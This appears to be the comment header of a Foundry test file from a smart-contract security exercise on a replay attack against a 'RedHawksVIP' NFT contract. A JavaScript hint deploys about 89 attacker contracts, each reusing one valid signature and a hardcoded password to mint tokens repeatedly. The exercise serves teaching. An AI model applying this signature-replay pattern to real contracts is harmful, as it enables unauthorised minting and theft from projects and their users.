/**
@dev run "forge test --match-contract RA3 -vvvvv" 

@notice This exercise has a different logic than original solution: The idea is to create multiple samrt contracts (~89 contracts).

@notice ðŸ”¥ The challenge is to use this approach and implement the solution in Foundry. Obviously, after you have implemented the orginal solution,

****************Hint****************
Here's the logic in javascript using AttackRedHawksVIP.sol
for (let i = 1; i <= 89; i++) {
        //Creating the smart contract
      this.attackredHawks = await AttackRedHawksFactory.deploy(
        this.redHawks.address
      );

    //Using the smart contract to attack RedHawksVIP
      j++;
      this.attackredHawks.attack(i, j, "RedHawksRulzzz133", validSignature);
      console.log(`Minted: ${i + j}, ${i + j + 1}`);
    }
